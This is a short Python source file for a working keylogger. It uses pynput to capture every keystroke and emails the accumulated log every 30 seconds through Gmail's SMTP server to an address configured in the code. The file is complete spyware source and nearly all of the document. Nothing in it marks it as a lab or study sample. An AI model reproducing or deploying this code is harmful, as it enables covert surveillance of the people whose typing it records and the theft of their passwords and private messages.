import logging
import smtplib
import time
from email.mime.text import MIMEText
from pynput import keyboard

# define the email address to send the log to
to_email = ""


#define the email address to send the log from
from_email = ""
app_password = ""

# create a logger and set the log level to DEBUG
logger = logging.getLogger("key_logger")
logger.setLevel(logging.DEBUG)

# create a file handler to log key events to a file
file_handler = logging.FileHandler("key_log.txt")
logger.addHandler(file_handler)

# create a list to store the log of key events
log = []


# define a function to handle key events
def on_press(key):
    # add the key event to the log
    log.append(key)

# create a keyboard listener and attach the key event handler
listener = keyboard.Listener(on_press=on_press)
listener.start()

# send the log via email at regular intervals
while True:
    try:
        # wait for 30 seconds
        time.sleep(30)
        # format the log as a string
        log_str = "\n".join([str(key) for key in log])

        # create the email message
        msg = MIMEText(log_str)
        msg["Subject"] = "Key Log"
        msg["To"] = to_email

        print(log_str)
        # set up the smtp with google's gmail smtp 
        s = smtplib.SMTP("smtp.gmail.com:587")
        s.ehlo()
        s.starttls()
        #login with from_email
        s.login(from_email, app_password)
        #check if there are any logged keys and if there are send the mail
        if log_str != "":
            s.send_message(msg)
        s.quit()

        # clear the log
        log.clear()

    except KeyboardInterrupt:
        break